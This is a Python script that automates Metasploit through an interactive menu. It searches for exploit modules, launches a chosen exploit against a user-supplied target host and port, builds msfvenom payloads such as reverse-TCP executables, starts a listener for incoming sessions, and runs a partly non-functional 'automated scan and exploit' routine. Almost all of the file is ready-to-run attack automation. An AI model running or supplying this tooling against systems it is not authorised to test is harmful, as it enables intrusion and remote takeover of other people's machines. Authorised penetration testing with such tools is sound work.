#!/usr/bin/env python3
import subprocess
import json
import os
import time
from datetime import datetime
from collections import defaultdict

class MetasploitAutomation:
    def __init__(self):
        self.msf_path = '/usr/bin/msfconsole'
        self.output_dir = f"msf_session_{int(datetime.now().timestamp())}"
        self.sessions = []
        self.exploits = defaultdict(dict)
        
    def check_metasploit(self):
        try:
            result = subprocess.run(['msfconsole', '-v'], capture_output=True, text=True, timeout=10)
            
            if 'metasploit' in result.stdout.lower():
                print(f"\033[92m[+] Metasploit detected\033[0m")
                return True
            
            return False
        
        except Exception:
            return False
    
    def search_exploits(self, keyword, exploit_type=None):
        print(f"\033[93m[*] Searching exploits: {keyword}\033[0m")
        
        rc_file = self._create_rc_file([
            f'search {keyword}',
            'exit'
        ])
        
        cmd = ['msfconsole', '-q', '-r', rc_file]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            exploits = []
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'exploit/' in line or 'auxiliary/' in line or 'payload/' in line:
                    parts = line.split()
                    
                    if len(parts) >= 3:
                        exploits.append({
                            'name': parts[0],
                            'rank': parts[1] if len(parts) > 1 else 'unknown',
                            'description': ' '.join(parts[2:])
                        })
            
            print(f"\033[92m[+] Found {len(exploits)} modules\033[0m")
            
            for i, exploit in enumerate(exploits[:20], 1):
                print(f"\033[97m  {i}. {exploit['name']} ({exploit['rank']})\033[0m")
            
            return exploits
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return []
        finally:
            if os.path.exists(rc_file):
                os.remove(rc_file)
    
    def get_exploit_info(self, exploit_path):
        print(f"\033[93m[*] Getting exploit info: {exploit_path}\033[0m")
        
        rc_file = self._create_rc_file([
            f'use {exploit_path}',
            'info',
            'exit'
        ])
        
        cmd = ['msfconsole', '-q', '-r', rc_file]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            info = {
                'name': exploit_path,
                'options': [],
                'targets': [],
                'payloads': []
            }
            
            lines = result.stdout.split('\n')
            
            for line in lines:
                if 'Name:' in line:
                    info['full_name'] = line.split('Name:')[1].strip()
                elif 'Disclosure Date:' in line:
                    info['disclosure_date'] = line.split('Disclosure Date:')[1].strip()
                elif 'Rank:' in line:
                    info['rank'] = line.split('Rank:')[1].strip()
            
            print(f"\033[92m[+] Retrieved exploit information\033[0m")
            
            return info
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
        finally:
            if os.path.exists(rc_file):
                os.remove(rc_file)
    
    def run_exploit(self, exploit_path, target_host, target_port, payload=None, options=None):
        print(f"\033[93m[*] Launching exploit: {exploit_path}\033[0m")
        print(f"\033[97m  Target: {target_host}:{target_port}\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        commands = [
            f'use {exploit_path}',
            f'set RHOST {target_host}',
            f'set RPORT {target_port}',
            'set VERBOSE true'
        ]
        
        if payload:
            commands.append(f'set PAYLOAD {payload}')
        
        if options:
            for key, value in options.items():
                commands.append(f'set {key} {value}')
        
        commands.append('exploit -z')
        commands.append('exit')
        
        rc_file = self._create_rc_file(commands)
        
        cmd = ['msfconsole', '-q', '-r', rc_file]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            output_file = os.path.join(self.output_dir, f"exploit_{int(time.time())}.txt")
            
            with open(output_file, 'w') as f:
                f.write(result.stdout)
            
            if 'session' in result.stdout.lower() and 'opened' in result.stdout.lower():
                print(f"\033[92m[+] Session opened!\033[0m")
                
                self.sessions.append({
                    'exploit': exploit_path,
                    'target': f"{target_host}:{target_port}",
                    'timestamp': datetime.now().isoformat()
                })
                
                return True
            else:
                print(f"\033[91m[!] Exploit failed\033[0m")
                return False
        
        except subprocess.TimeoutExpired:
            print(f"\033[91m[!] Exploit timeout\033[0m")
            return False
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
        finally:
            if os.path.exists(rc_file):
                os.remove(rc_file)
    
    def run_auxiliary(self, auxiliary_path, target_host, target_port, options=None):
        print(f"\033[93m[*] Running auxiliary: {auxiliary_path}\033[0m")
        
        commands = [
            f'use {auxiliary_path}',
            f'set RHOSTS {target_host}',
            f'set RPORT {target_port}',
            'set VERBOSE true',
            'run',
            'exit'
        ]
        
        if options:
            for key, value in options.items():
                commands.insert(3, f'set {key} {value}')
        
        rc_file = self._create_rc_file(commands)
        
        cmd = ['msfconsole', '-q', '-r', rc_file]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            os.makedirs(self.output_dir, exist_ok=True)
            
            output_file = os.path.join(self.output_dir, f"auxiliary_{int(time.time())}.txt")
            
            with open(output_file, 'w') as f:
                f.write(result.stdout)
            
            print(f"\033[92m[+] Auxiliary complete\033[0m")
            print(f"\033[97m  Output: {output_file}\033[0m")
            
            return result.stdout
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
        finally:
            if os.path.exists(rc_file):
                os.remove(rc_file)
    
    def generate_payload(self, payload_type, lhost, lport, output_format='exe', output_file=None):
        print(f"\033[93m[*] Generating payload: {payload_type}\033[0m")
        
        os.makedirs(self.output_dir, exist_ok=True)
        
        if not output_file:
            output_file = os.path.join(self.output_dir, f"payload_{int(time.time())}.{output_format}")
        
        cmd = [
            'msfvenom',
            '-p', payload_type,
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', output_format,
            '-o', output_file
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            if os.path.exists(output_file):
                print(f"\033[92m[+] Payload generated: {output_file}\033[0m")
                
                file_size = os.path.getsize(output_file)
                print(f"\033[97m  Size: {file_size} bytes\033[0m")
                
                return output_file
            else:
                print(f"\033[91m[!] Payload generation failed\033[0m")
                return None
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return None
    
    def setup_handler(self, payload_type, lhost, lport):
        print(f"\033[93m[*] Setting up handler: {payload_type}\033[0m")
        
        commands = [
            'use exploit/multi/handler',
            f'set PAYLOAD {payload_type}',
            f'set LHOST {lhost}',
            f'set LPORT {lport}',
            'set EXITONSESSION false',
            'exploit -j -z'
        ]
        
        rc_file = self._create_rc_file(commands)
        
        cmd = ['msfconsole', '-q', '-r', rc_file]
        
        try:
            print(f"\033[92m[+] Handler started\033[0m")
            print(f"\033[97m  Listening: {lhost}:{lport}\033[0m")
            
            subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            return True
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def list_payloads(self, platform=None):
        print(f"\033[93m[*] Listing payloads...\033[0m")
        
        search_term = f'{platform}/' if platform else ''
        
        cmd = ['msfvenom', '--list', 'payloads']
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            payloads = []
            
            for line in result.stdout.split('\n'):
                if search_term in line and '/' in line:
                    parts = line.strip().split()
                    
                    if parts:
                        payloads.append(parts[0])
            
            print(f"\033[92m[+] Found {len(payloads)} payloads\033[0m")
            
            for i, payload in enumerate(payloads[:30], 1):
                print(f"\033[97m  {i}. {payload}\033[0m")
            
            return payloads
        
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return []
    
    def automated_scan_exploit(self, target_host, port_range='1-1000'):
        print(f"\033[93m[*] Automated scan and exploit: {target_host}\033[0m")
        
        print(f"\n\033[97m[1/3] Port scanning...\033[0m")
        
        scan_result = self.run_auxiliary('auxiliary/scanner/portscan/tcp', target_host, port_range)
        
        if not scan_result:
            return False
        
        open_ports = []
        
        for line in scan_result.split('\n'):
            if 'open' in line.lower():
                try:
                    port = int(line.split(':')[1].split()[0])
                    open_ports.append(port)
                except:
                    pass
        
        print(f"\033[92m[+] Found {len(open_ports)} open ports\033[0m")
        
        print(f"\n\033[97m[2/3] Service detection...\033[0m")
        
        services = {}
        
        for port in open_ports[:10]:
            result = self.run_auxiliary('auxiliary/scanner/portscan/tcp', target_host, str(port))
            
            services[port] = 'unknown'
        
        print(f"\n\033[97m[3/3] Exploit matching...\033[0m")
        
        for port, service in services.items():
            print(f"\033[93m[*] Searching exploits for port {port}...\033[0m")
            
            exploits = self.search_exploits(str(port))
            
            if exploits:
                print(f"\033[92m[+] Found {len(exploits)} potential exploits\033[0m")
        
        return True
    
    def _create_rc_file(self, commands):
        os.makedirs(self.output_dir, exist_ok=True)
        
        rc_file = os.path.join(self.output_dir, f"msf_{int(time.time())}.rc")
        
        with open(rc_file, 'w') as f:
            f.write('\n'.join(commands))
        
        return rc_file
    
    def generate_report(self):
        os.makedirs(self.output_dir, exist_ok=True)
        
        report_file = os.path.join(self.output_dir, 'msf_report.json')
        
        report = {
            'session_date': datetime.now().isoformat(),
            'output_directory': self.output_dir,
            'total_sessions': len(self.sessions),
            'sessions': self.sessions,
            'exploits_used': dict(self.exploits)
        }
        
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n\033[92m[+] Report saved: {report_file}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     METASPLOIT MODULE AUTOMATION")
    print("="*70 + "\033[0m\n")
    
    msf = MetasploitAutomation()
    
    if not msf.check_metasploit():
        print(f"\033[91m[!] Metasploit not found. Please install: apt-get install metasploit-framework\033[0m")
        return
    
    print("\033[97mMetasploit Options:\033[0m")
    print("\033[97m  [1] Search exploits\033[0m")
    print("\033[97m  [2] Run exploit\033[0m")
    print("\033[97m  [3] Run auxiliary module\033[0m")
    print("\033[97m  [4] Generate payload\033[0m")
    print("\033[97m  [5] Setup handler\033[0m")
    print("\033[97m  [6] List payloads\033[0m")
    print("\033[97m  [7] Automated scan & exploit\033[0m")
    
    choice = input(f"\n\033[95m[?] Select option: \033[0m").strip()
    
    if choice == '1':
        keyword = input("\033[95m[?] Search keyword: \033[0m").strip()
        
        msf.search_exploits(keyword)
    
    elif choice == '2':
        exploit = input("\033[95m[?] Exploit path: \033[0m").strip()
        target = input("\033[95m[?] Target host: \033[0m").strip()
        port = input("\033[95m[?] Target port: \033[0m").strip()
        payload = input("\033[95m[?] Payload (optional): \033[0m").strip() or None
        
        msf.run_exploit(exploit, target, port, payload)
        msf.generate_report()
    
    elif choice == '3':
        auxiliary = input("\033[95m[?] Auxiliary path: \033[0m").strip()
        target = input("\033[95m[?] Target host: \033[0m").strip()
        port = input("\033[95m[?] Target port: \033[0m").strip()
        
        msf.run_auxiliary(auxiliary, target, port)
    
    elif choice == '4':
        payload = input("\033[95m[?] Payload type (e.g., windows/meterpreter/reverse_tcp): \033[0m").strip()
        lhost = input("\033[95m[?] LHOST: \033[0m").strip()
        lport = input("\033[95m[?] LPORT: \033[0m").strip()
        format_type = input("\033[95m[?] Output format (exe/elf/raw): \033[0m").strip() or 'exe'
        
        msf.generate_payload(payload, lhost, lport, format_type)
    
    elif choice == '5':
        payload = input("\033[95m[?] Payload type: \033[0m").strip()
        lhost = input("\033[95m[?] LHOST: \033[0m").strip()
        lport = input("\033[95m[?] LPORT: \033[0m").strip()
        
        msf.setup_handler(payload, lhost, lport)
    
    elif choice == '6':
        platform = input("\033[95m[?] Platform filter (windows/linux/android/empty): \033[0m").strip() or None
        
        msf.list_payloads(platform)
    
    elif choice == '7':
        target = input("\033[95m[?] Target host: \033[0m").strip()
        port_range = input("\033[95m[?] Port range (default 1-1000): \033[0m").strip() or '1-1000'
        
        msf.automated_scan_exploit(target, port_range)
        msf.generate_report()
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
